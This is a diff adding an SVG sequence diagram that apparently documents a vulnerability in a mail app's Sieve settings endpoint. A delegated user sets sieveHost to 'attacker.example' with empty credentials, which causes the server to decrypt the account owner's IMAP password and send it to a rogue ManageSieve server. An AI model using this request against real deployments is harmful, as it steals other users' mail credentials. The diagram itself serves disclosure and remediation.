@@ -1,0 +1,161 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1732.3845 652.45" width="1732.3845" height="652.45" style="--bg:#FFFFFF;--fg:#1E293B;--line:#64748B;--muted:#475569;--surface:#F8FAFC;--border:#CBD5E1;background:var(--bg)">
+<style>
+  text, tspan, .mono { font-family: 'Times New Roman', Times, serif, Times, serif !important; }
+  svg {
+    /* Derived from --bg and --fg (overridable via --line, --accent, etc.) */
+    --_text:          var(--fg);
+    --_text-sec:      var(--muted, color-mix(in srgb, var(--fg) 60%, var(--bg)));
+    --_text-muted:    var(--muted, color-mix(in srgb, var(--fg) 40%, var(--bg)));
+    --_text-faint:    color-mix(in srgb, var(--fg) 25%, var(--bg));
+    --_line:          var(--line, color-mix(in srgb, var(--fg) 50%, var(--bg)));
+    --_arrow:         var(--accent, color-mix(in srgb, var(--fg) 85%, var(--bg)));
+    --_node-fill:     var(--surface, color-mix(in srgb, var(--fg) 3%, var(--bg)));
+    --_node-stroke:   var(--border, color-mix(in srgb, var(--fg) 20%, var(--bg)));
+    --_group-fill:    var(--bg);
+    --_group-hdr:     color-mix(in srgb, var(--fg) 5%, var(--bg));
+    --_inner-stroke:  color-mix(in srgb, var(--fg) 12%, var(--bg));
+    --_key-badge:     color-mix(in srgb, var(--fg) 10%, var(--bg));
+  }
+</style>
+<defs>
+  <marker id="seq-arrow" markerWidth="8" markerHeight="5" refX="8" refY="2.5" orient="auto-start-reverse">
+    <polygon points="0 0, 8 2.5, 0 5" fill="var(--_arrow)" />
+  </marker>
+  <marker id="seq-arrow-open" markerWidth="8" markerHeight="5" refX="8" refY="2.5" orient="auto-start-reverse">
+    <polyline points="0 0, 8 2.5, 0 5" fill="none" stroke="var(--_arrow)" stroke-width="1" />
+  </marker>
+</defs>
+<line class="lifeline" data-actor="Attacker" x1="131.07849999999996" y1="92.45" x2="131.07849999999996" y2="622.45" stroke="var(--_line)" stroke-width="0.75" stroke-dasharray="6 4" />
+<line class="lifeline" data-actor="SieveCtrl" x1="622.2284999999999" y1="70" x2="622.2284999999999" y2="622.45" stroke="var(--_line)" stroke-width="0.75" stroke-dasharray="6 4" />
+<line class="lifeline" data-actor="DelegationSvc" x1="833.0104999999999" y1="70" x2="833.0104999999999" y2="622.45" stroke="var(--_line)" stroke-width="0.75" stroke-dasharray="6 4" />
+<line class="lifeline" data-actor="AccountSvc" x1="1009.9594999999999" y1="70" x2="1009.9594999999999" y2="622.45" stroke="var(--_line)" stroke-width="0.75" stroke-dasharray="6 4" />
+<line class="lifeline" data-actor="Crypto" x1="1155.0995" y1="70" x2="1155.0995" y2="622.45" stroke="var(--_line)" stroke-width="0.75" stroke-dasharray="6 4" />
+<line class="lifeline" data-actor="HostVal" x1="1315.0595" y1="70" x2="1315.0595" y2="622.45" stroke="var(--_line)" stroke-width="0.75" stroke-dasharray="6 4" />
+<line class="lifeline" data-actor="RogueSieve" x1="1568.702" y1="70" x2="1568.702" y2="622.45" stroke="var(--_line)" stroke-width="0.75" stroke-dasharray="6 4" />
+<g class="message" data-from="Attacker" data-to="SieveCtrl" data-label="POST /api/accounts/{id}/sieve (sieveHost=&quot;attacker.example&quot;, sieveUser=&quot;&quot;, sievePassword=&quot;&quot;)" data-line-style="solid" data-arrow-head="filled" data-self="false" data-step="1">
+  <line x1="131.07849999999996" y1="112.45" x2="622.2284999999999" y2="112.45" stroke="var(--_line)" stroke-width="1" marker-end="url(#seq-arrow)" />
+  <rect x="127.65349999999995" y="94.3" width="498" height="16.3" rx="2" ry="2" fill="var(--bg)" />
+  <text x="376.65349999999995" y="102.45" font-size="11" text-anchor="middle" font-weight="400" fill="var(--_text-muted)" dy="3.8499999999999996">POST /api/accounts/{id}/sieve (sieveHost=&quot;attacker.example&quot;, sieveUser=&quot;&quot;, sievePassword=&quot;&quot;)</text>
+  <circle class="sequence-number" cx="131.07849999999996" cy="112.45" r="9" fill="var(--_arrow)" stroke="var(--bg)" stroke-width="1" />
+  <text x="131.07849999999996" y="112.45" class="sequence-number-label" font-size="10" text-anchor="middle" font-weight="600" fill="var(--bg)" dy="3.5">1</text>
+</g>
+<g class="message" data-from="SieveCtrl" data-to="DelegationSvc" data-label="resolveAccountUserId(id, &quot;User B&quot;)" data-line-style="solid" data-arrow-head="filled" data-self="false" data-step="2">
+  <line x1="622.2284999999999" y1="152.45" x2="833.0104999999999" y2="152.45" stroke="var(--_line)" stroke-width="1" marker-end="url(#seq-arrow)" />
+  <rect x="632.6194999999999" y="134.29999999999998" width="190" height="16.3" rx="2" ry="2" fill="var(--bg)" />
+  <text x="727.6194999999999" y="142.45" font-size="11" text-anchor="middle" font-weight="400" fill="var(--_text-muted)" dy="3.8499999999999996">resolveAccountUserId(id, &quot;User B&quot;)</text>
+  <circle class="sequence-number" cx="622.2284999999999" cy="152.45" r="9" fill="var(--_arrow)" stroke="var(--bg)" stroke-width="1" />
+  <text x="622.2284999999999" y="152.45" class="sequence-number-label" font-size="10" text-anchor="middle" font-weight="600" fill="var(--bg)" dy="3.5">2</text>
+</g>
+<g class="message" data-from="DelegationSvc" data-to="SieveCtrl" data-label="Return owner &quot;User A&quot;" data-line-style="dashed" data-arrow-head="filled" data-self="false" data-step="3">
+  <line x1="833.0104999999999" y1="192.45" x2="622.2284999999999" y2="192.45" stroke="var(--_line)" stroke-width="1" stroke-dasharray="6 4" marker-end="url(#seq-arrow)" />
+  <rect x="666.1194999999999" y="174.29999999999998" width="123" height="16.3" rx="2" ry="2" fill="var(--bg)" />
+  <text x="727.6194999999999" y="182.45" font-size="11" text-anchor="middle" font-weight="400" fill="var(--_text-muted)" dy="3.8499999999999996">Return owner &quot;User A&quot;</text>
+  <circle class="sequence-number" cx="833.0104999999999" cy="192.45" r="9" fill="var(--_arrow)" stroke="var(--bg)" stroke-width="1" />
+  <text x="833.0104999999999" y="192.45" class="sequence-number-label" font-size="10" text-anchor="middle" font-weight="600" fill="var(--bg)" dy="3.5">3</text>
+</g>
+<g class="message" data-from="SieveCtrl" data-to="AccountSvc" data-label="find(&quot;User A&quot;, id)" data-line-style="solid" data-arrow-head="filled" data-self="false" data-step="4">
+  <line x1="622.2284999999999" y1="232.45" x2="1009.9594999999999" y2="232.45" stroke="var(--_line)" stroke-width="1" marker-end="url(#seq-arrow)" />
+  <rect x="771.5939999999999" y="214.29999999999998" width="89" height="16.3" rx="2" ry="2" fill="var(--bg)" />
+  <text x="816.0939999999999" y="222.45" font-size="11" text-anchor="middle" font-weight="400" fill="var(--_text-muted)" dy="3.8499999999999996">find(&quot;User A&quot;, id)</text>
+  <circle class="sequence-number" cx="622.2284999999999" cy="232.45" r="9" fill="var(--_arrow)" stroke="var(--bg)" stroke-width="1" />
+  <text x="622.2284999999999" y="232.45" class="sequence-number-label" font-size="10" text-anchor="middle" font-weight="600" fill="var(--bg)" dy="3.5">4</text>
+</g>
+<g class="message" data-from="AccountSvc" data-to="SieveCtrl" data-label="Return MailAccount entity" data-line-style="dashed" data-arrow-head="filled" data-self="false" data-step="5">
+  <line x1="1009.9594999999999" y1="272.45" x2="622.2284999999999" y2="272.45" stroke="var(--_line)" stroke-width="1" stroke-dasharray="6 4" marker-end="url(#seq-arrow)" />
+  <rect x="746.0939999999999" y="254.29999999999998" width="140" height="16.3" rx="2" ry="2" fill="var(--bg)" />
+  <text x="816.0939999999999" y="262.45" font-size="11" text-anchor="middle" font-weight="400" fill="var(--_text-muted)" dy="3.8499999999999996">Return MailAccount entity</text>
+  <circle class="sequence-number" cx="1009.9594999999999" cy="272.45" r="9" fill="var(--_arrow)" stroke="var(--bg)" stroke-width="1" />
+  <text x="1009.9594999999999" y="272.45" class="sequence-number-label" font-size="10" text-anchor="middle" font-weight="600" fill="var(--bg)" dy="3.5">5</text>
+</g>
+<g class="message" data-from="SieveCtrl" data-to="HostVal" data-label="isValid(&quot;attacker.example&quot;)" data-line-style="solid" data-arrow-head="filled" data-self="false" data-step="6">
+  <line x1="622.2284999999999" y1="312.45" x2="1315.0595" y2="312.45" stroke="var(--_line)" stroke-width="1" marker-end="url(#seq-arrow)" />
+  <rect x="895.644" y="294.3" width="146" height="16.3" rx="2" ry="2" fill="var(--bg)" />
+  <text x="968.644" y="302.45" font-size="11" text-anchor="middle" font-weight="400" fill="var(--_text-muted)" dy="3.8499999999999996">isValid(&quot;attacker.example&quot;)</text>
+  <circle class="sequence-number" cx="622.2284999999999" cy="312.45" r="9" fill="var(--_arrow)" stroke="var(--bg)" stroke-width="1" />
+  <text x="622.2284999999999" y="312.45" class="sequence-number-label" font-size="10" text-anchor="middle" font-weight="600" fill="var(--bg)" dy="3.5">6</text>
+</g>
+<g class="message" data-from="HostVal" data-to="SieveCtrl" data-label="Host is Valid (Public DNS)" data-line-style="dashed" data-arrow-head="filled" data-self="false" data-step="7">
+  <line x1="1315.0595" y1="352.45" x2="622.2284999999999" y2="352.45" stroke="var(--_line)" stroke-width="1" stroke-dasharray="6 4" marker-end="url(#seq-arrow)" />
+  <rect x="899.644" y="334.3" width="138" height="16.3" rx="2" ry="2" fill="var(--bg)" />
+  <text x="968.644" y="342.45" font-size="11" text-anchor="middle" font-weight="400" fill="var(--_text-muted)" dy="3.8499999999999996">Host is Valid (Public DNS)</text>
+  <circle class="sequence-number" cx="1315.0595" cy="352.45" r="9" fill="var(--_arrow)" stroke="var(--bg)" stroke-width="1" />
+  <text x="1315.0595" y="352.45" class="sequence-number-label" font-size="10" text-anchor="middle" font-weight="600" fill="var(--bg)" dy="3.5">7</text>
+</g>
+<g class="message" data-from="SieveCtrl" data-to="Crypto" data-label="decrypt(mailAccount.getInboundPassword())" data-line-style="solid" data-arrow-head="filled" data-self="false" data-step="8">
+  <line x1="622.2284999999999" y1="407.45" x2="1155.0995" y2="407.45" stroke="var(--_line)" stroke-width="1" marker-end="url(#seq-arrow)" />
+  <rect x="769.664" y="389.3" width="238" height="16.3" rx="2" ry="2" fill="var(--bg)" />
+  <text x="888.664" y="397.45" font-size="11" text-anchor="middle" font-weight="400" fill="var(--_text-muted)" dy="3.8499999999999996">decrypt(mailAccount.getInboundPassword())</text>
+  <circle class="sequence-number" cx="622.2284999999999" cy="407.45" r="9" fill="var(--_arrow)" stroke="var(--bg)" stroke-width="1" />
+  <text x="622.2284999999999" y="407.45" class="sequence-number-label" font-size="10" text-anchor="middle" font-weight="600" fill="var(--bg)" dy="3.5">8</text>
+</g>
+<g class="message" data-from="Crypto" data-to="SieveCtrl" data-label="Return PLAINTEXT IMAP Password / Master Password" data-line-style="dashed" data-arrow-head="filled" data-self="false" data-step="9">
+  <line x1="1155.0995" y1="447.45" x2="622.2284999999999" y2="447.45" stroke="var(--_line)" stroke-width="1" stroke-dasharray="6 4" marker-end="url(#seq-arrow)" />
+  <rect x="740.664" y="429.3" width="296" height="16.3" rx="2" ry="2" fill="var(--bg)" />
+  <text x="888.664" y="437.45" font-size="11" text-anchor="middle" font-weight="400" fill="var(--_text-muted)" dy="3.8499999999999996">Return PLAINTEXT IMAP Password / Master Password</text>
+  <circle class="sequence-number" cx="1155.0995" cy="447.45" r="9" fill="var(--_arrow)" stroke="var(--bg)" stroke-width="1" />
+  <text x="1155.0995" y="447.45" class="sequence-number-label" font-size="10" text-anchor="middle" font-weight="600" fill="var(--bg)" dy="3.5">9</text>
+</g>
+<g class="message" data-from="SieveCtrl" data-to="RogueSieve" data-label="SieveClient::createClient(host, port, user, decryptedPassword)" data-line-style="solid" data-arrow-head="filled" data-self="false" data-step="10">
+  <line x1="622.2284999999999" y1="487.45" x2="1568.702" y2="487.45" stroke="var(--_line)" stroke-width="1" marker-end="url(#seq-arrow)" />
+  <rect x="930.46525" y="469.3" width="330" height="16.3" rx="2" ry="2" fill="var(--bg)" />
+  <text x="1095.46525" y="477.45" font-size="11" text-anchor="middle" font-weight="400" fill="var(--_text-muted)" dy="3.8499999999999996">SieveClient::createClient(host, port, user, decryptedPassword)</text>
+  <circle class="sequence-number" cx="622.2284999999999" cy="487.45" r="9" fill="var(--_arrow)" stroke="var(--bg)" stroke-width="1" />
+  <text x="622.2284999999999" y="487.45" class="sequence-number-label" font-size="10" text-anchor="middle" font-weight="600" fill="var(--bg)" dy="3.5">10</text>
+</g>
+<g class="message" data-from="RogueSieve" data-to="SieveCtrl" data-label="Connection failed / Auth recorded" data-line-style="dashed" data-arrow-head="filled" data-self="false" data-step="11">
+  <line x1="1568.702" y1="542.45" x2="622.2284999999999" y2="542.45" stroke="var(--_line)" stroke-width="1" stroke-dasharray="6 4" marker-end="url(#seq-arrow)" />
+  <rect x="1005.96525" y="524.3000000000001" width="179" height="16.3" rx="2" ry="2" fill="var(--bg)" />
+  <text x="1095.46525" y="532.45" font-size="11" text-anchor="middle" font-weight="400" fill="var(--_text-muted)" dy="3.8499999999999996">Connection failed / Auth recorded</text>
+  <circle class="sequence-number" cx="1568.702" cy="542.45" r="9" fill="var(--_arrow)" stroke="var(--bg)" stroke-width="1" />
+  <text x="1568.702" y="542.45" class="sequence-number-label" font-size="10" text-anchor="middle" font-weight="600" fill="var(--bg)" dy="3.5">11</text>
+</g>
+<g class="message" data-from="SieveCtrl" data-to="Attacker" data-label="Connection error response (Credentials already exfiltrated)" data-line-style="dashed" data-arrow-head="filled" data-self="false" data-step="12">
+  <line x1="622.2284999999999" y1="582.45" x2="131.07849999999996" y2="582.45" stroke="var(--_line)" stroke-width="1" stroke-dasharray="6 4" marker-end="url(#seq-arrow)" />
+  <rect x="219.15349999999995" y="564.3000000000001" width="315" height="16.3" rx="2" ry="2" fill="var(--bg)" />
+  <text x="376.65349999999995" y="572.45" font-size="11" text-anchor="middle" font-weight="400" fill="var(--_text-muted)" dy="3.8499999999999996">Connection error response (Credentials already exfiltrated)</text>
+  <circle class="sequence-number" cx="622.2284999999999" cy="582.45" r="9" fill="var(--_arrow)" stroke="var(--bg)" stroke-width="1" />
+  <text x="622.2284999999999" y="582.45" class="sequence-number-label" font-size="10" text-anchor="middle" font-weight="600" fill="var(--bg)" dy="3.5">12</text>
+</g>
+<g class="note" data-position="over" data-actors="SieveCtrl">
+  <polygon points="499.21649999999994,360.45 739.2405,360.45 745.2405,366.45 745.2405,383.45 499.21649999999994,383.45" fill="var(--bg)" stroke="var(--_node-stroke)" stroke-width="0.75" />
+  <polygon points="739.2405,360.45 745.2405,366.45 739.2405,366.45" fill="var(--_inner-stroke)" stroke="var(--_node-stroke)" stroke-width="0.75" />
+  <text x="622.2284999999999" y="371.95" font-size="11" text-anchor="middle" font-weight="400" fill="var(--_text-muted)" dy="3.8499999999999996">Vulnerable Fallback: user and password empty</text>
+</g>
+<g class="note" data-position="over" data-actors="RogueSieve">
+  <polygon points="1435.8890000000001,495.45 1695.515,495.45 1701.515,501.45 1701.515,518.45 1435.8890000000001,518.45" fill="var(--bg)" stroke="var(--_node-stroke)" stroke-width="0.75" />
+  <polygon points="1695.515,495.45 1701.515,501.45 1695.515,501.45" fill="var(--_inner-stroke)" stroke="var(--_node-stroke)" stroke-width="0.75" />
+  <text x="1568.7020000000002" y="506.95" font-size="11" text-anchor="middle" font-weight="400" fill="var(--_text-muted)" dy="3.8499999999999996">Captures plain credentials via SASL PLAIN / LOGIN</text>
+</g>
+<g class="actor" data-id="Attacker" data-label="Attacker / Delegatee (User B)" data-type="actor">
+  <g transform="translate(113.07849999999996,32) scale(1.5)">
+    <path d="M21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3C16.9706 3 21 7.02944 21 12Z" fill="none" stroke="var(--_line)" stroke-width="0.6666666666666666" />
+    <path d="M15 10C15 11.6569 13.6569 13 12 13C10.3431 13 9 11.6569 9 10C9 8.34315 10.3431 7 12 7C13.6569 7 15 8.34315 15 10Z" fill="none" stroke="var(--_line)" stroke-width="0.6666666666666666" />
+    <path d="M5.62842 18.3563C7.08963 17.0398 9.39997 16 12 16C14.6 16 16.9104 17.0398 18.3716 18.3563" fill="none" stroke="var(--_line)" stroke-width="0.6666666666666666" />
+  </g>
+  <text x="131.07849999999996" y="84" font-size="13" text-anchor="middle" font-weight="500" fill="var(--_text)" dy="4.55">Attacker / Delegatee (User B)</text>
+</g>
+<g class="actor" data-id="SieveCtrl" data-label="SieveController" data-type="participant">
+  <rect x="558.5704999999999" y="30" width="127.316" height="40" rx="4" ry="4" fill="var(--_node-fill)" stroke="var(--_node-stroke)" stroke-width="1" />
+  <text x="622.2284999999999" y="50" font-size="13" text-anchor="middle" font-weight="500" fill="var(--_text)" dy="4.55">SieveController</text>
+</g>
+<g class="actor" data-id="DelegationSvc" data-label="DelegationService" data-type="participant">
+  <rect x="761.2014999999999" y="30" width="143.618" height="40" rx="4" ry="4" fill="var(--_node-fill)" stroke="var(--_node-stroke)" stroke-width="1" />
+  <text x="833.0104999999999" y="50" font-size="13" text-anchor="middle" font-weight="500" fill="var(--_text)" dy="4.55">DelegationService</text>
+</g>
+<g class="actor" data-id="AccountSvc" data-label="AccountService" data-type="participant">
+  <rect x="944.8195" y="30" width="130.28000000000003" height="40" rx="4" ry="4" fill="var(--_node-fill)" stroke="var(--_node-stroke)" stroke-width="1" />
+  <text x="1009.9594999999999" y="50" font-size="13" text-anchor="middle" font-weight="500" fill="var(--_text)" dy="4.55">AccountService</text>
+</g>
+<g class="actor" data-id="Crypto" data-label="ICrypto" data-type="participant">
+  <rect x="1115.0995" y="30" width="80" height="40" rx="4" ry="4" fill="var(--_node-fill)" stroke="var(--_node-stroke)" stroke-width="1" />
+  <text x="1155.0995" y="50" font-size="13" text-anchor="middle" font-weight="500" fill="var(--_text)" dy="4.55">ICrypto</text>
+</g>
+<g class="actor" data-id="HostVal" data-label="IRemoteHostValidator" data-type="participant">
+  <rect x="1235.0995" y="30" width="159.92000000000002" height="40" rx="4" ry="4" fill="var(--_node-fill)" stroke="var(--_node-stroke)" stroke-width="1" />
+  <text x="1315.0595" y="50" font-size="13" text-anchor="middle" font-weight="500" fill="var(--_text)" dy="4.55">IRemoteHostValidator</text>
+</g>
+<g class="actor" data-id="RogueSieve" data-label="Rogue ManageSieve (attacker.example)" data-type="participant">
+  <rect x="1435.0195" y="30" width="267.3649999999999" height="40" rx="4" ry="4" fill="var(--_node-fill)" stroke="var(--_node-stroke)" stroke-width="1" />
+  <text x="1568.702" y="50" font-size="13" text-anchor="middle" font-weight="500" fill="var(--_text)" dy="4.55">Rogue ManageSieve (attacker.example)</text>
+</g>
+</svg>
